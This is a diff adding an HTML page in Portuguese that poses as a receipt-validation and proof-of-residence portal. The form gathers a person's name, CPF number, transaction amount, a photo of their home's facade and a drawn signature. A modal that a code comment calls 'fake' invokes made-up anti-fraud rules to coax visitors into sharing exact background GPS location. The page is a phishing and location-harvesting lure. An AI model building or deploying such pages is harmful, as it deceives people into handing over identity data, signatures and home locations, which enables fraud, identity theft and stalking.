@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação de Recibo e Segurança Residencial</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container animate-fade-in">
+        <div class="header-card">
+            <h2>Portal de Validação</h2>
+            <p>Confirmação de Transação e Prova de Residência</p>
+        </div>
+
+        <!-- Alerta de status animado -->
+        <div id="statusGPS" class="aviso status-alerta">
+            ⚠️ <span>Aguardando validação de geolocalização por satélite...</span>
+        </div>
+
+        <form id="reciboForm">
+            <div class="input-group">
+                <label for="nomeCliente">Nome do Titular / Cliente</label>
+                <input type="text" id="nomeCliente" required placeholder="Digite o nome completo">
+            </div>
+
+            <div class="input-group">
+                <label for="cpfCliente">CPF do Titular</label>
+                <input type="text" id="cpfCliente" required maxlength="14" placeholder="000.000.000-00">
+            </div>
+
+            <div class="input-group">
+                <label for="valorRecibo">Valor da Transação (R$)</label>
+                <input type="text" id="valorRecibo" required placeholder="0,00">
+            </div>
+
+            <div class="input-group">
+                <label for="fotoFachada">Comprovação Visual (Foto da Fachada / Local)</label>
+                <input type="file" id="fotoFachada" accept="image/*" required>
+            </div>
+
+            <div class="input-group">
+                <label>Assinatura Digital do Titular</label>
+                <button type="button" id="btnAbrirModal" class="btn-abrir-assinatura">✍️ Assinar em Tela Cheia</button>
+                <div id="statusAssinatura" class="status-assinatura animate-pop">✅ Assinatura capturada com sucesso!</div>
+            </div>
+
+            <button type="submit" id="btnAssinar" disabled>Concluir e Enviar Recibo</button>
+        </form>
+    </div>
+
+    <!-- MODAL FALSO DE LOCALIZAÇÃO -->
+    <div id="modalLocalizacao" class="modal-overlay">
+        <div class="modal-box animate-scale-up">
+            <div class="radar-container">
+                <div class="radar-circle"></div>
+                <div class="radar-scanner"></div>
+                <div class="radar-dot"></div>
+            </div>
+            
+            <h3>Validação de Proximidade</h3>
+            <p>Por normas de segurança antifraude, precisamos confirmar se o seu aparelho está fisicamente no endereço do imóvel cadastrado através do GPS em segundo plano.</p>
+            <p class="modal-subtext">Como deseja prosseguir com a verificação de sinal?</p>
+            
+            <button type="button" id="btnEscolhaFixa" class="btn-opcao-local btn-opcao-destaque">🛰️ Confirmar Localização Exata (Recomendado)</button>
+            <button type="button" id="btnEscolhaAproximada" class="btn-opcao-local">⚠️ Utilizar Localização Aproximada</button>
+            <button type="button" id="btnEscolhaNao" class="btn-opcao-local btn-perigo">❌ Recusar Verificação</button>
+        </div>
+    </div>
+
+    <!-- MODAL DE TELA CHEIA PARA ASSINATURA -->
+    <div id="modalAssinatura">
+        <div class="modal-canvas-wrapper">
+            <canvas id="signature-canvas"></canvas>
+        </div>
+        <div class="modal-footer">
+            <button type="button" id="btnLimparAssinatura" class="btn-modal-limpar">🗑️ Limpar</button>
+            <button type="button" id="btnSalvarAssinatura" class="btn-modal-salvar">💾 Salvar</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.1.7/dist/signature_pad.umd.min.js"></script>
+    <script type="module" src="script.js"></script>
+</body>
+</html>
